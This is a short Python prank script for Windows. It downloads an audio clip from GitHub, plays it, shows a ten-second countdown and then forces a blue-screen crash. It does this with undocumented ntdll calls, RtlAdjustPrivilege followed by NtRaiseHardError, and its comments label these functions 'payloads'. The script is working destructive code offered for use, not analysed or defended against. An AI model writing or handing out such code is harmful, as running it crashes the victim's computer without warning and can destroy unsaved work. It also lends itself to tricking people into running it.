#---<imports>---
from ctypes import windll , c_int , c_uint , c_ulong , POINTER , byref
from subprocess import check_call,DEVNULL,STDOUT
from sys import executable
from os import path,mkdir,getcwd,system
try:
    from requests import get
except:
    print('The requests package has not yet been installed. Pressing enter will automatically install it.')
    gh = input()
    print('Installing...')
    check_call([executable, '-m', 'pip', 'install','requests'],stdout=DEVNULL,stderr=STDOUT)
    from requests import get
    print('Done!')

from winsound import PlaySound,SND_ASYNC
from time import sleep

#---<payloads>---
def getfile():
    depreq = get('https://github.com/CodeSyncio/computer-outro-downloadables/blob/main/outro.wav?raw=true')
    if path.exists('MP3'): pass
    else: mkdir('MP3')
    open(f'{getcwd()}\\MP3\\outro.wav', 'wb').write(depreq.content)
    system('cls')
def bsod():
    nullptr = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(c_uint(19) , c_uint(1) , c_uint(0) , byref(c_int()))
    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B) , c_ulong(0) , nullptr , nullptr , c_uint(6) , byref(c_uint()))
    
def play():
    PlaySound(f'{getcwd()}/MP3/outro.wav', SND_ASYNC)
     
#---<start>---
if __name__ == '__main__':
    getfile()
    play()
    for i in range(10):
        system('cls')
        print(f'BSOD in {str(10-i)} seconds...')
        sleep(1)
    sleep(0.5)
    bsod()
    
